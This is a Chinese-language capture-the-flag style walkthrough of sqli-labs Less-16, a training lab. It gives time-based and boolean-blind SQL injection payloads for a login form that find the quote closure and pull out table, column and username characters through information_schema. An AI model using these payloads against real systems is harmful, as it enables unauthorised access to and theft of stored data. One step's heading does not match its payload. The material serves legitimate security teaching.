---
title: Less - 16
date: 2023-03-15T11:26:27Z
lastmod: 2023-03-15T12:21:25Z
---

# Less - 16

---

# 通关教程

---

## 1、判断闭合

---

```html
uname=admin'&passwd=admin&submit=Submit #没有错误回显
uname=admin"&passwd=admin&submit=Submit #没有错误回显
```

​![image](assets/image-20230315121235-4i97dam.png)​

​![image](assets/image-20230315121258-s35ixs6.png)​

没有错误回显，我们只能一个一个去猜闭合方式，利用时间盲注去判断注入点

```html
uname=admin' and sleep(5)#&passwd=admin&submit=Submit #快速反应
uname=admin" and sleep(5)#&passwd=admin&submit=Submit #快速反应
uname=admin") and sleep(5)#&passwd=admin&submit=Submit #页面休眠5秒
```

​![image](assets/image-20230315121425-w5vkpnt.png)​

判断这里闭合方式为")，并且为字符型注入

---

## 2、查看当前数据库长度

---

```html
uname=ad") or length(database())=8#&passwd=admin&submit=Submit
```

​![image](assets/image-20230315121628-nomtplu.png)​

---

## 3、判断当前数据库的第一个字母

---

```html
uname=ad") or substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e'#&passwd=admin&submit=Submit
```

​![image](assets/image-20230315121829-4ed2pmi.png)​

---

## 4、判断users表下的第一个字段的第一个字母

---

```html
uname=ad") or substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='a'#&passwd=admin&submit=Submit
```

​![image](assets/image-20230315121924-7hm4rok.png)​

---

## 5、判断username字段的第一个值的第一个字母

---

```html
uname=ad") or substr((select username from security.users limit 0,1),1,1)='d'#&passwd=admin&submit=Submit
```

​![image](assets/image-20230315122115-xu963f7.png)​

‍
